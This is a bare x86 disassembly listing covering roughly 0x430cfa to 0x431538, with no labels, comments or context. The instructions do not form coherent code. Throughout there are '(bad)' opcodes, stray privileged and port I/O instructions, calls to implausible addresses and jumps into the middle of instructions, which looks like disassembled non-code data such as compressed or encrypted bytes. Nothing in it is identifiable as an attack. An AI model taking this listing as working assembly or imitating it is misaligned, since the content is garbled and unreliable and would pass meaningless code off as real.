  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
